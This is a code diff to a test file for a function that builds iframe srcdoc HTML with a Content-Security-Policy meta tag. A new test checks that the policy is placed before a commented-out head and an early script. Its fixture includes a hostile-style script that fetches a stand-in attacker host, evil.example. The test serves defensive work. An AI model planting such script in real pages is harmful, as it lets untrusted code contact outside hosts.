@@ -50,7 +50,15 @@ describe("buildStaticSrcdoc", () => {
   it("leaves outside resources alone and wraps a fragment in a document", () => {
     const doc = buildStaticSrcdoc({ "index.html": '<link rel="stylesheet" href="https://fonts.example.com/a.css"><p>Hi</p>' })!;
     expect(doc).toContain('href="https://fonts.example.com/a.css"');
-    expect(doc.startsWith("<!doctype html><html><head><meta http-equiv")).toBe(true);
+    expect(doc.startsWith("<!doctype html><meta http-equiv")).toBe(true);
+  });
+
+  it("puts the policy before anything the page says, so a commented-out <head> or an early script can't get ahead of it", () => {
+    const sneaky = buildStaticSrcdoc({ "index.html": "<!--<head>--><script>fetch('https://evil.example')</script><!doctype html><html><head></head><body></body></html>" })!;
+    expect(sneaky.indexOf("Content-Security-Policy")).toBeLessThan(sneaky.indexOf("<!--<head>-->"));
+    const normal = buildStaticSrcdoc({ "index.html": "<!DOCTYPE html>\n<html lang=\"en\"><head><title>T</title></head><body><script>1</script></body></html>" })!;
+    expect(normal.startsWith('<!DOCTYPE html><meta http-equiv="Content-Security-Policy"')).toBe(true);
+    expect(normal.indexOf("Content-Security-Policy")).toBeLessThan(normal.indexOf("<script>1"));
   });
 
   it("is null for a page that doesn't exist", () => {
